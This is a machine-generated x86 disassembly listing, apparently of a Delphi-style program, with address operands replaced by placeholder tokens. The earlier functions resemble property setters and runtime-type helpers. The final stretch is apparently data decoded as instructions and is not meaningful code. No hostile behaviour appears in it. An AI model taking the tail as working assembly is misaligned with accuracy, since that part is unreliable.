call sub_43c464
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
sub_404c9c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x58 ]
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x58 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov dl [ ebp - 0x5 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
sub_404d1c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x59 ]
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x59 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov dl [ ebp - 0x5 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
sub_404d9c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x5c ]
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
sub_404e1c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x60 ]
call sub_44ce70
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x60
mov edx [ ebp - 0x8 ]
call sub_44cb34
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
sub_404ea8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
sub_404f28
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
mov ax [ ebp - 0x6 ]
mov edx [ ebp - 0x4 ]
cmp ax [ edx + 0x68 ]
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ax [ ebp - 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x68 ] ax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov dx [ ebp - 0x6 ]
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
sub_404fb0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x6a ]
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6a ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov dl [ ebp - 0x5 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_43c464
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
sub_405030
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x54 ]
call sub_44ce70
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] al
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442930
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test [ eax + 0x20 ] 0x1
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_404c10
sub_40509c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x72 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_4050d0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x59 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043fc
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_405108
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40512d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405134
retn
sub_405178
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ esi + ecx + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ edx + ecx - 0x1 ]
xor bl [ esi + ecx ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4051c4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x1
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405178
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
call sub_446450
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_4051fc
push ebx
push esi
push edi
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ edx + ebx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_405268
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_4052dc
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_405338
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_40538c
push ebp
mov ebp esp
add esp 0xfffffef4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10c ]
mov edx [ ebp - 0xc ]
mov ecx 0xff
call sub_44cd3c
lea ecx [ ebp - 0x10c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405338
mov esp ebp
pop ebp
retn
sub_4053e4
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4053c8
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_405440
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_405424
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_405480
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4054d2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_44d1d0
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405440
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4054d9
lea eax [ ebp - 0x10 ]
call sub_44d0c8
retn
sub_4054e0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40538c
jmp r-xdata
sub al 0x5
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4053e4
jmp r-xdata
dec al
je r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405480
jmp r-xdata
sub_405538
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov ecx [ edx ]
mov ecx [ ecx ]
mov bl [ ecx + 0x1 ]
mov bl [ ecx + ebx + 0x2 ]
shl ebx 0x2
fld [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ecx 0xffffff
lea esi [ eax + ecx ]
call [ ebx + r-xdata ]
sub esp [ ebx + sub_40557d ]
mov esi esp
call [ ebx + r-xdata ]
cmp [ edx + 0xb ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
sub_40557d
add al 0x0
add [ eax ] al
or [ eax ] al
add [ eax ] al
or al 0x0
add [ eax ] al
or [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
movsd [ edi ] [ esi ]
push ebp
inc eax
add [ eax - 0x54ffbfab ] ch
push ebp
inc eax
add [ esi - 0x4effbfab ] ch
push ebp
inc eax
add cl bl
push ds
retn
sub_4055ec
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4055d0
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_40562c
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_405664
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_4056a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4056e6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4056ed
retn
mov eax rw-data
call sub_44cae0
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_44d340
sub_4056f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40571d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405724
retn
sub_405730
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405761
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405768
retn
mov eax [ rw-data ]
call sub_44c070
sub_405b48
stc
push ebx
push edx
inc [ esp + ebx * 4 ]
inc eax
add [ eax ] dh
xchg ebx eax
inc eax
add ah ah
xchg esp eax
inc eax
add [ edx * 4 - 0x64e3ffc0 ] ch
inc eax
add al ah
0x90900040 0x40
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
das
je r-xdata
imul esp [ ebp + 0x79 ] 0x73
insd
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
inc ecx
jne r-xdata
inc eax
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
add [ eax ] al
imul ebp [ edi + 0x6e ] sub_44a54c
sub al 0x0
add bh bh
adc [ ecx - 0x6253ffc0 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
pop es
inc ebx
push 0x656b6365
inc eax
add [ eax ] dh
add bh bh
sub [ eax + 0x10040 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
or eax 0x4d627553
outsb
dec esp
movsd [ edi ] [ esi ]
inc esp
add [ eax + eax ] ch
push es
add [ 0x61657242 ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
cld
fld [ eax ]
sbb [ ecx - 0x65a3ffc0 ] 0x40
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060005 ] al
imul esi [ ebp + ebp * 2 + 0x61 ] 0x4057cc70
imul esi [ eax ] 0xffffff95
inc esp
add [ eax + eax ] ah
outsd
add [ edx ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
je r-xdata
mov al [ 0x330044a5 ]
add [ eax ] al
[ edx + edx * 4 + 0x10040 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
popad
jae r-xdata
inc edx
jb r-xdata
jns r-xdata
dec eax
outsd
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
insd
loopne r-xdata
movsd [ edi ] [ esi ]
inc esp
add [ ecx ] dh
add [ eax ] al
dec ecx
outsb
js r-xdata
or al 0x0
or al [ edi + 0x72 ]
outsd
jne r-xdata
xchg edx eax
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
movsd [ edi ] [ esi ]
inc esp
add [ esi ] ch
add [ eax ] al
[ eax - 0x6b ]
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
pop es
inc esp
popa
jne r-xdata
outsb
jne r-xdata
popad
add bh bh
aam 0x90
inc eax
add [ eax - 0x63 ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070007 ] al
popad
jo r-xdata
je r-xdata
add [ eax ] dh
add [ eax ] al
call [ eax - 0x56 ]
inc eax
inc eax
add ah ch
mov ch 0x43
add [ edi ] dl
add [ 0x756e654d ] al
jae r-xdata
clc
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] cl
js r-xdata
je r-xdata
add [ eax ] al
add [ eax + 0x41060002 ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
je r-xdata
add al bh
movsb [ edi ] [ esi ]
inc ebx
add [ ebx + edx * 4 ] al
inc eax
add ah al
cdq
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
mov al 0x9e
inc eax
add [ eax ] al
xor [ ebp + r--data ] dl
add bh bh
dec esp
add [ eax ] al
call [ esi + ebx * 4 ]
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000e ] al
imul ebp [ esi + 0x74 ] r-xdata
xor al 0x0
add bh bh
adc [ eax + eax * 2 + 0x409e7c00 ] dl
add bh bh
dec eax
add [ eax ] al
dec [ eax - 0x62 ]
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x65480b00
insb
jo r-xdata
xchg ecx eax
inc eax
add al ah
popfd
inc eax
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
movsd [ edi ] [ esi ]
inc esp
add [ 0xfffffffff8ff0000 ] ch
0x10040 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x69420600
je r-xdata
add [ eax ] al
[ eax + ebp * 4 + 0x40 ]
inc eax
add [ edi ] ch
add bh bh
loopne r-xdata
outsd
dec ecx
je r-xdata
nop
inc ebx
jne r-xdata
[ eax ]
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
cmp bh 0xff
xchg esp eax
inc eax
add [ esi + ebx * 4 + 0x40 ] bh
inc eax
add ah ah
sahf
inc eax
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xf4656c62
movsd [ edi ] [ esi ]
inc ebx
add [ eax - 0x7f010000 ] al
add [ eax ] al
[ eax ]
lahf
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070013 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
insd
fsub [ ebp + r--data ]
add bh bh
lodsb [ esi ]
xchg ebx eax
inc eax
add [ eax + 0x409e ] dh
inc ebx
add [ esp + ebp ] bh
inc esp
add [ eax + 0x100044c2 ] ah
and al [ eax + eax - 0x58 ]
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120015 ] al
outsb
inc ecx
jbe r-xdata
dec esp
movsd [ edi ] [ esi ]
inc esp
add [ edx ] dh
add [ eax ] al
jmp eax
adc [ ecx + 0x75 ] eax
je r-xdata
add [ eax + eax ] bh
add bh bh
movsb [ edi ] [ esi ]
nop
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push edi
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
retn 0x44
ja r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
add [ edx ] ch
pop edi
inc eax
add [ esi ] bh
pop edi
inc eax
add [ eax ] cl
add [ eax ] al
hlt
je r-xdata
cld
jb r-xdata
sbb [ edi + 0x40 ] bl
add [ eax ] al
insd
lodsb [ esi ]
pop eax
inc eax
add [ eax - 0x6f010000 ] dl
retn 0x44
jae r-xdata
insd
adc al 0x59
inc eax
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0016 ] al
outsb
dec ebp
popad
daa
inc esp
add al ah
daa
inc esp
add [ esp + ebp - 0x54dfffbc ] bl
inc eax
add [ eax - 0x4b ] bl
inc eax
add [ eax - 0x54 ] bl
inc eax
add [ ebp + esi * 4 + 0xe0040 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xor [ ebp + 0x300044 ] dl
add [ eax ] al
add eax [ eax ]
std
inc eax
add ah al
dec ecx
je r-xdata
daa
inc esp
add [ eax ] dh
sub [ eax + eax - 0x7c ] eax
sub al 0x44
add ah bh
add [ eax + 0x5f ] cl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
nop
nop
nop
fcomp [ esi + 0x40 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
pop edi
